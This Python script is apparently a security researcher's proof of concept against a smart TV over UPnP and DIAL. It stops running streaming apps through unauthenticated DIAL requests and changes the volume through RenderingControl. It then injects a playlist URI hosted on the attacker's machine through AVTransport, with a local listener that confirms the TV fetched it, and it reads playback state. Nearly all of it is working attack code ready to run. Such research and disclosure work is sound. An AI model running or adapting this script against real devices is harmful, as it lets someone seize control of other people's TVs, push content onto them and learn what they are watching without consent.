#!/usr/bin/env python3
"""
Prep TV (stop active apps) then run full media injection + SSRF confirmation.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import re
import sys
import time
import threading
import http.server
import socketserver
import json
import datetime
import os
import tempfile

_project_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_project_tmp, exist_ok=True)
tempfile.tempdir = _project_tmp

import requests

TARGET = "192.168.18.6"
ATTACKER = "192.168.18.147"
LISTEN_PORT = 9999
UPNP = 2870
DIAL = 56789

HITS = []


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        hit = {
            "time": datetime.datetime.utcnow().isoformat() + "Z",
            "peer": self.client_address[0],
            "path": self.path,
            "ua": self.headers.get("User-Agent", ""),
        }
        HITS.append(hit)
        print(f"\n  *** INBOUND REQUEST ***  peer={hit['peer']}  path={hit['path']}  ua={hit['ua']}")
        if self.path.endswith(".m3u8"):
            body = (
                "#EXTM3U\n#EXT-X-VERSION:3\n"
                f"#EXT-X-STREAM-INF:BANDWIDTH=800000\n"
                f"http://{ATTACKER}:{LISTEN_PORT}/stream.ts\n"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.apple.mpegurl")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            body = b"Uniao Geek PoC - Media Injected via UPnP AVTransport\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def log_message(self, *args):
        pass


def soap(service_type, action, inner_xml, path):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        "<s:Body>"
        f'<u:{action} xmlns:u="{service_type}">{inner_xml}</u:{action}>'
        "</s:Body></s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{service_type}#{action}"',
    }
    return requests.post(
        f"http://{TARGET}:{UPNP}/{path}", data=body.encode(), headers=headers, timeout=8
    )


def get_state(app):
    try:
        r = requests.get(f"http://{TARGET}:{DIAL}/apps/{app}", timeout=4)
        m = re.search(r"<state>(\w+)</state>", r.text)
        return m.group(1) if m else "unknown"
    except Exception:
        return "unreachable"


def stop_app(app):
    try:
        r = requests.delete(f"http://{TARGET}:{DIAL}/apps/{app}/run", timeout=5)
        return r.status_code
    except Exception:
        return -1


def main():
    evidence = {"timestamp": datetime.datetime.utcnow().isoformat() + "Z", "steps": []}

    def log(msg, data=None):
        entry = {"msg": msg, "data": data}
        evidence["steps"].append(entry)
        print(msg)

    # ── Step 1: stop any running apps ─────────────────────────────────────
    log("\n[1] Clearing active apps...")
    for app in ["Netflix", "YouTube", "AmazonInstantVideo", "Spotify"]:
        state = get_state(app)
        if state == "running":
            code = stop_app(app)
            log(f"    Stopped {app}: HTTP {code}", {"app": app, "stop_http": code})
            time.sleep(1)
        elif state not in ("stopped", "unreachable"):
            log(f"    {app}: {state}")

    time.sleep(2)

    # ── Step 2: volume control ─────────────────────────────────────────────
    log("\n[2] Unauthorized volume control...")
    RC = "urn:schemas-upnp-org:service:RenderingControl:1"

    r = soap(RC, "GetVolume",
             "<InstanceID>0</InstanceID><Channel>Master</Channel>",
             "control/RenderingControl")
    vol_match = re.search(r"<CurrentVolume>(\d+)</CurrentVolume>", r.text)
    original_vol = int(vol_match.group(1)) if vol_match else None
    log(f"    Current volume: {original_vol}", {"http": r.status_code, "body": r.text[:200]})

    r2 = soap(RC, "SetVolume",
              "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>3</DesiredVolume>",
              "control/RenderingControl")
    log(f"    SetVolume=3: HTTP {r2.status_code}", {"http": r2.status_code})

    # ── Step 3: media injection + SSRF ────────────────────────────────────
    log("\n[3] Media injection via AVTransport...")
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"

    srv = socketserver.TCPServer(("", LISTEN_PORT), Handler)
    srv.allow_reuse_address = True
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    log(f"    Listener started: {ATTACKER}:{LISTEN_PORT}")

    inject_uri = f"http://{ATTACKER}:{LISTEN_PORT}/injected.m3u8"
    r3 = soap(AVT, "SetAVTransportURI",
              f"<InstanceID>0</InstanceID><CurrentURI>{inject_uri}</CurrentURI>"
              "<CurrentURIMetaData></CurrentURIMetaData>",
              "control/AVTransport")
    log(f"    SetAVTransportURI={inject_uri}: HTTP {r3.status_code}",
        {"http": r3.status_code, "body": r3.text[:200]})

    r4 = soap(AVT, "Play",
              "<InstanceID>0</InstanceID><Speed>1</Speed>",
              "control/AVTransport")
    log(f"    Play: HTTP {r4.status_code}", {"http": r4.status_code, "body": r4.text[:300]})

    log("    Waiting 10s for TV callback...")
    for _ in range(10):
        time.sleep(1)
        sys.stdout.write(".")
        sys.stdout.flush()
        if HITS:
            break
    print()

    srv.shutdown()

    if HITS:
        log("\n    [!!] SSRF CONFIRMED — TV fetched attacker URI!", {"hits": HITS})
    else:
        log("\n    [!] No callback in 10s (TV may be on non-home screen or DMR busy)")

    # ── Step 4: transport state info disclosure ────────────────────────────
    log("\n[4] Transport state (info disclosure)...")
    r5 = soap(AVT, "GetTransportInfo",
              "<InstanceID>0</InstanceID>",
              "control/AVTransport")
    log(f"    GetTransportInfo: HTTP {r5.status_code}", {"body": r5.text[:400]})

    r6 = soap(AVT, "GetPositionInfo",
              "<InstanceID>0</InstanceID>",
              "control/AVTransport")
    log(f"    GetPositionInfo: HTTP {r6.status_code}", {"body": r6.text[:400]})

    # ── Step 5: restore volume ─────────────────────────────────────────────
    if original_vol is not None:
        r7 = soap(RC, "SetVolume",
                  f"<InstanceID>0</InstanceID><Channel>Master</Channel>"
                  f"<DesiredVolume>{original_vol}</DesiredVolume>",
                  "control/RenderingControl")
        log(f"\n[5] Restored volume to {original_vol}: HTTP {r7.status_code}")

    # ── Save evidence ──────────────────────────────────────────────────────
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "inject_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence -> {out}")


if __name__ == "__main__":
    main()
